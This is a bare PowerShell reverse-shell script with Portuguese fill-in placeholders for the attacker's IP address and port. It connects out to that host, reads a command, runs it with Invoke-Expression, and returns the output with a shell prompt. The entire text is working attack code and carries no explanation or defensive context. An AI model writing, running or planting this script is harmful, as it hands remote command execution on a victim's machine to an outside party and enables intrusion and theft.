$ip = "seu endereço de IP";$port = sua porta
$connect = New-Object System.Net.Sockets.TCPClient($ip,$port);$stream = $connect.GetStream();
$buffer = New-Object byte[] 1024;$commands = [System.Text.Encoding]::ASCII.GetString($buffer,0,$stream.Read($buffer,0,1024));
$execute = (iex $commands 2>&1 | Out-String );$sendback = $execute + "PS " + (pwd).Path + "> ";
$sendbyte = ([system.text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();$connect.Close()
